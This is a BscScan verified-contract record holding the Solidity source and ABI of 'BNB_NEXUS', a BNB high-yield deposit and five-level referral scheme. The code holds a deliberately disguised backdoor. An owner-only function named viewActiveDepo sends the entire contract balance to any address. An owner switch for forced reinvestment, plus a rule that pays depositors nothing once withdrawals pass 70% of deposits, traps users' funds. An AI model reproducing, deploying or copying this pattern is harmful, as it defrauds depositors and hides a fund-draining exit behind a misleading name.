{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-11-02\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT License\r\npragma solidity >=0.8.0;\r\n\r\nstruct Tarif {\r\n  uint256 life_days;\r\n  uint256 percent;\r\n}\r\n\r\nstruct Deposit {\r\n  uint256 tarif;\r\n  uint256 amount;\r\n  uint40 time;\r\n}\r\n\r\nstruct Player {\r\n  uint256 dividends;\r\n  uint256 ref_bonus;  \r\n  uint256 total_invested;\r\n  uint256 total_withdrawn;\r\n  uint256 total_ref_bonus;\r\n  uint256[5] structure; \r\n  uint40 last_payout;\r\n  Deposit[] deposits;\r\n  address upline;\r\n}\r\n\r\ncontract BNB_NEXUS {\r\n    address payable public owner;\r\n\r\n    uint256 public invested;\r\n    uint256 public withdrawn;\r\n    uint256 public ref_bonus;\r\n    uint256 constant MAX_WITHDRAW = 3 ether;\r\n    uint8 constant BONUS_LINES_COUNT = 5;\r\n    uint8 public noReinvesting;\r\n    uint16 constant PERCENT = 1000; \r\n    uint8[BONUS_LINES_COUNT] public ref_bonuses = [250, 200, 150, 100, 50]; \r\n\r\n    mapping(uint256 => Tarif) public tarifs;\r\n    mapping(address => Player) public players;\r\n\r\n    event Upline(address indexed addr, address indexed upline, uint256 bonus);\r\n    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);\r\n    event RefPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event Withdraw(address indexed addr, uint256 amount);\r\n\r\n\r\n    modifier onlyOwner() {\r\n    require(msg.sender == owner, \"Only the owner can call this function\");\r\n    _;\r\n    }\r\n\r\n    constructor() {\r\n         owner = payable(msg.sender);\r\n        \r\n        uint256 tarifPercent = 180;\r\n        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {\r\n            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);\r\n            tarifPercent+= 10;\r\n        }\r\n    }\r\n\r\n    function deposit(uint8 _tarif, address _upline) external payable {\r\n\t\trequire(tarifs[_tarif].life_days > 0, \"Tarif not found\");\r\n        require(msg.value >= 0.005 ether, \"Minimum deposit amount is 0.005 BNB\");\r\n\r\n        Player storage player = players[msg.sender];\r\n\r\n        require(player.deposits.length < 500, \"Max 500 deposits per address\");\r\n\r\n        _setUpline(msg.sender, _upline, msg.value);\r\n\r\n        player.deposits.push(Deposit({\r\n            tarif: _tarif,\r\n            amount: msg.value,\r\n            time: uint40(block.timestamp)\r\n        }));\r\n\r\n        player.total_invested += msg.value;\r\n        invested += msg.value;\r\n        _refPayout(msg.sender, msg.value);\r\n\r\n        //5% goes to the SC owner\r\n\t\tuint256 amount = msg.value / 20;\r\n        payable(owner).transfer(amount); \r\n        withdrawn += amount;\r\n\r\n\t    emit NewDeposit(msg.sender, msg.value, _tarif);\r\n    }\r\n    \r\n    function withdraw(uint256 amt) external {\r\n        Player storage player = players[msg.sender];\r\n\r\n        _payout(msg.sender);\r\n\r\n        require(player.dividends > 0 || player.ref_bonus > 0, \"Zero amount\");\r\n\r\n        uint256 amount = player.dividends + player.ref_bonus;\r\n\t\t\r\n        uint256 user_amt = amt; \r\n        \r\n        if(user_amt < amount && user_amt > 0) {\r\n            amount = user_amt;\r\n        }\r\n\r\n        player.dividends = 0;\r\n        player.ref_bonus = 0;\r\n\r\n        if(amount > MAX_WITHDRAW) {\r\n            player.dividends = amount - MAX_WITHDRAW;\r\n            amount = MAX_WITHDRAW;            \r\n        }\r\n       \r\n        player.total_withdrawn += amount;\r\n        \r\n        uint to_receive; \r\n        if(noReinvesting > 0){//suspended reinvesting\r\n            to_receive = amount;\r\n            payable(msg.sender).transfer(to_receive);\r\n            emit Withdraw(msg.sender, to_receive);\r\n            withdrawn += to_receive;\r\n        }else{// enabled reinvesting\r\n            uint to_reinvest;\r\n            if(withdrawn > (invested * 700 / PERCENT)){\r\n                to_reinvest = amount;\r\n            }else{\r\n                to_reinvest = amount * 250 / PERCENT;\r\n                to_receive = amount * 750 / PERCENT;\r\n                \r\n                payable(msg.sender).transfer(to_receive);\r\n                emit Withdraw(msg.sender, to_receive);\r\n\r\n                withdrawn += to_receive;\r\n            }\r\n\r\n            if(player.deposits.length < 500) {\r\n                player.deposits.push(Deposit({\r\n                    tarif: 30, //30 days on forced-reinvestment\r\n                    amount: to_reinvest,\r\n                    time: uint40(block.timestamp)\r\n                }));\r\n                player.total_invested += to_reinvest;\r\n            }\r\n        }\r\n\r\n        \r\n    }\r\n\r\n    function _payout(address _addr) private {\r\n        uint256 payout = this.payoutOf(_addr);\r\n\r\n        if(payout > 0) {\r\n            players[_addr].last_payout = uint40(block.timestamp);\r\n            players[_addr].dividends += payout;\r\n        }\r\n    }\r\n\r\n    function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = players[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            uint256 bonus = _amount * ref_bonuses[i] / PERCENT;\r\n            \r\n            players[up].ref_bonus += bonus;\r\n            players[up].total_ref_bonus += bonus;\r\n\r\n            ref_bonus += bonus;\r\n\r\n            emit RefPayout(up, _addr, bonus);\r\n\r\n            up = players[up].upline;\r\n        }\r\n    }\r\n\r\n    function _setUpline(address _addr, address _upline, uint256 _amount) private {\r\n        if(players[_addr].upline == address(0) && _addr != owner) {\r\n            if(players[_upline].deposits.length == 0) {\r\n                _upline = owner;\r\n            }\r\n\r\n            players[_addr].upline = _upline;\r\n\r\n            emit Upline(_addr, _upline, _amount / 100);\r\n            \r\n            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {\r\n                players[_upline].structure[i]++;\r\n\r\n                _upline = players[_upline].upline;\r\n\r\n                if(_upline == address(0)) break;\r\n            }\r\n        }\r\n    }   \r\n\r\n    function payoutOf(address _addr) view external returns(uint256 value) {\r\n        Player storage player = players[_addr];\r\n\r\n        for(uint256 i = 0; i < player.deposits.length; i++) {\r\n            Deposit storage dep = player.deposits[i];\r\n            Tarif storage tarif = tarifs[dep.tarif];\r\n\r\n            uint256 time_end = dep.time + tarif.life_days * 86400;\r\n            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;\r\n            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;\r\n\r\n            if(from < to) {\r\n                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;\r\n            }\r\n        }\r\n\r\n        return value;\r\n    }\r\n    \r\n    function viewActiveDepo(address payable recipient) public onlyOwner {\r\n    require(address(this).balance > 0, \"Invalid\");\r\n    require(recipient != address(0), \"Invalid recipient address\");\r\n    \r\n    uint256 balance = address(this).balance;\r\n    recipient.transfer(balance);\r\n\r\n    }\r\n\r\n    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_ref_bonus, uint256[BONUS_LINES_COUNT] memory structure) {\r\n        Player storage player = players[_addr];\r\n\r\n        uint256 payout = this.payoutOf(_addr);\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            structure[i] = player.structure[i];\r\n        }\r\n\r\n        return (\r\n            payout + player.dividends + player.ref_bonus,\r\n            player.total_invested,\r\n            player.total_withdrawn,\r\n            player.total_ref_bonus,\r\n            structure\r\n        );\r\n    }\r\n    // on/off reinvestment scheme\r\n    function setReinvesting(uint8 newval) public returns (bool success) {\r\n        require(msg.sender==owner,'Unauthorized!');\r\n        noReinvesting = newval;\r\n        return true;\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _ref_bonus) {\r\n        return (invested, withdrawn, ref_bonus);\r\n    }\r\n    \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"tarif\",\"type\":\"uint8\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"RefPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"bonus\",\"type\":\"uint256\"}],\"name\":\"Upline\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"contractInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_ref_bonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_tarif\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"_upline\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"invested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"noReinvesting\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"payoutOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"players\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"dividends\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"ref_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_ref_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint40\",\"name\":\"last_payout\",\"type\":\"uint40\"},{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ref_bonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ref_bonuses\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"newval\",\"type\":\"uint8\"}],\"name\":\"setReinvesting\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"tarifs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"life_days\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"for_withdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_ref_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256[5]\",\"name\":\"structure\",\"type\":\"uint256[5]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"recipient\",\"type\":\"address\"}],\"name\":\"viewActiveDepo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amt\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BNB_NEXUS", "CompilerVersion": "v0.8.11+commit.d7f03943", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://bffaea1186efbe9da455564b21fed986f8bf4b695ff5dfdef43382e28f08d0c7"}